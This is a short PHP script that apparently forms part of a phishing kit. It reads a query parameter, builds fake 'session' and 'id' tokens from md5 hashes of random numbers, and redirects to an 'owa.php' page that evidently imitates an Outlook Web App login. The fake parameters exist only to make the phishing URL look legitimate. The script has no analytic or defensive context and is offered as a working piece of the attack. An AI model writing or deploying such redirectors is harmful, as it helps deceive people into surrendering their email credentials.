<?php
include('waa.php'); 
include('otenka.php');

$sR23_7 = $_GET['sR23_7'];
$praga=rand();
$praga=md5($praga);

header("location: owa.php?crsfauth=websrc&id=$praga$praga&session=$praga$praga&sR23_7=$sR23_7&idd=$praga");

?>
